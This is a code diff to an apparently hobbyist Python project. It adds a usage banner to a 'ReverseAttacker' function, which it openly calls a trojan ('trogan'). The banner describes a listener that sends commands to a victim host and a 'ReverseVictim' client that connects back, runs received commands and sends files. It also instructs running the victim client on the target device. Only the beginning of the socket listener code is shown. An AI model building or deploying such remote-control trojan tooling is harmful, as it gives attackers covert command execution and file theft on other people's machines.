@@ -9,6 +9,21 @@ def Logo(Data):
 
 
 def ReverseAttacker():
+    print("""
+This trogan is can:
+                ** file upload
+                ** file down load
+                ** and control file
+                ** it is impoved from project 18
+    ReverseAttacker => Listens for a connection, sends commands,
+            and can download files from the connected host.
+    reverseV => Connects back to the attacker, runs received
+            commands, or sends file contents.
+        useage:
+            Run ReverseAttacker on your device to listen => then
+            run ReverseVictim on the target device to connect back
+            and exchange commands/files
+""")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     l=int(input("Enter port: "))
     try:
@@ -63,3 +78,4 @@ def ReverseAttacker():
             print(data.decode())
 
 #ReverseAttacker()
+
